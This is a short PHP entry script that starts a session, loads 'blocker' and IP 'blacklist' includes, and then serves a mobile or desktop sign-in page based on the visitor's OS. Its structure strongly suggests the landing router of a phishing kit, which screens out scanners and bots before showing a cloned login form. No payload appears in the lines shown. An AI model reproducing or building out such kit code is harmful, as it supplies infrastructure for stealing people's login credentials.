<?php
session_start();
require_once('../main.php');
require_once("../blocker.php");
// require_once("../blocker2.php");
require_once('../lang.php');
require_once('../session.php');
$ip = getUserIP();
require_once("blacklist.php");
  if($os == "Android" or $os == "iPhone") {
    require_once("files/signin_mobile.php");
  }else{
    require_once("files/signin.php");
  }